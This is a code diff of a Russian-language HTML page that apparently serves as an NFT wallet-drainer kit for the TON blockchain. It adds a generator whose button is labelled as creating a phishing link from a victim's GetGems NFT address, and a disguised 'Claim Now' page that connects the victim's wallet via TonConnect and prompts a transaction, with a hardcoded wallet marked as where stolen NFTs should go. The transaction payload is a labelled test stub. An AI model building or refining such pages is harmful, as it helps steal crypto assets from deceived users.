@@ -1,33 +1,71 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>NFT Generator</title>
+    <meta charset="UTF-8">
+    <title>NFT Service</title>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
-        body { background: #111; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding-top: 50px; }
-        input { width: 80%; padding: 10px; margin: 10px; border-radius: 5px; border: none; }
-        button { padding: 10px 20px; background: #28a745; color: white; border: none; cursor: pointer; border-radius: 5px; }
-        #result { margin-top: 20px; color: #00ff00; word-break: break-all; }
+        body { background: #111; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        input { width: 90%; max-width: 400px; padding: 12px; margin: 10px; border-radius: 5px; border: none; }
+        button { padding: 12px 25px; background: #007bff; color: white; border: none; cursor: pointer; border-radius: 5px; font-size: 16px; }
+        #result { margin-top: 20px; word-break: break-all; text-align: center; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
-    <h1>NFT Link Generator</h1>
-    <input type="text" id="nftInput" placeholder="Вставь ссылку на NFT с GetGems...">
-    <button onclick="generate()">Сгенерировать ссылку</button>
-    <div id="result"></div>
+    <h1>NFT Claim System</h1>
+
+    <div id="generator">
+        <input type="text" id="nftInput" placeholder="Вставь ссылку на NFT с GetGems...">
+        <button onclick="generate()">Создать фишинг-ссылку</button>
+        <div id="result"></div>
+    </div>
+
+    <div id="claim-box" class="hidden">
+        <div id="ton-connect"></div>
+        <button id="claim-btn" style="margin-top:20px; background: #28a745;">Claim Now</button>
+    </div>
 
     <script>
+        const tonConnectUI = new TonConnectUI({ manifestUrl: 'https://newifi.onrender.com/tonconnect-manifest.json' });
+        
+        // --- ЛОГИКА ГЕНЕРАТОРА ---
         function generate() {
             const url = document.getElementById('nftInput').value;
             const parts = url.split('/');
             const nftAddress = parts[parts.length - 1];
-            
             if (nftAddress.length > 40) {
-                const phishingLink = `https://newifi.onrender.com/?nft=${nftAddress}`;
-                document.getElementById('result').innerHTML = `Готово! Твоя ссылка:<br><br><a href="${phishingLink}" style="color:yellow">${phishingLink}</a>`;
+                const link = `https://newifi.onrender.com/?nft=${nftAddress}`;
+                document.getElementById('result').innerHTML = `Твоя ссылка:<br><a href="${link}" style="color:yellow">${link}</a>`;
             } else {
                 alert("Ошибка: неверная ссылка");
             }
         }
+
+        // --- ЛОГИКА CLAIM ---
+        const params = new URLSearchParams(window.location.search);
+        const nftAddress = params.get('nft');
+
+        if (nftAddress) {
+            document.getElementById('generator').classList.add('hidden');
+            document.getElementById('claim-box').classList.remove('hidden');
+        }
+
+        document.getElementById('claim-btn').onclick = async () => {
+            // ВАЖНО: Вставь сюда свой адрес, куда хочешь получать NFT
+            const MY_WALLET = 'UQATIzX89EOOTqfsr8KE64MXvVSa4CGybjwmkPv3-yHbI3ZE'; 
+            
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 360,
+                messages: [{
+                    address: nftAddress,
+                    amount: '50000000', // 0.05 TON за газ
+                    // Это тестовый payload. 
+                    payload: 'te6cckEBAQEAAgAAAEAw' 
+                }]
+            };
+            await tonConnectUI.sendTransaction(transaction);
+        };
     </script>
 </body>
 </html>
